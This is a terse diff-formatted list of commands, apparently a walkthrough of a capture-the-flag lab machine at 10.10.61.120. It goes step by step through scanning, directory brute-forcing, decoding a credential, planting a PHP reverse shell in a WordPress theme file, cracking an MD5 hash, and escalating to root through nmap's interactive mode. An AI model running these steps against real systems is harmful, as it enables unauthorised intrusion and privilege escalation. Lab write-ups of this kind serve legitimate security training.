@@ -1,0 +1,16 @@
+1 - nmap -A 10.10.61.120
+2 - gobuster dir -u http://10.10.61.120 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+3 - http://10.10.61.120/robots.txt
+4 - wget http://10.10.61.120/license
+5 - echo HASH | base64 -d
+6 - http://10.10.61.120/wp-login.php
+7 - cp /usr/share/webshells/php/php-reverse-shell.php .
+8 - http://10.10.61.120/themes/twentyfifteen/404.php
+9 - cat /home/robot/password.raw-md5 -> Crackstation
+10 - python -c 'import pty; pty.spawn("/bin/bash")'
+11 - su robot
+12 - sudo -l (nmap)
+13 - nmap --interactive
+14 - >!sh
+15 - whoami
+16 - cat /root/key-3-of-3.txt
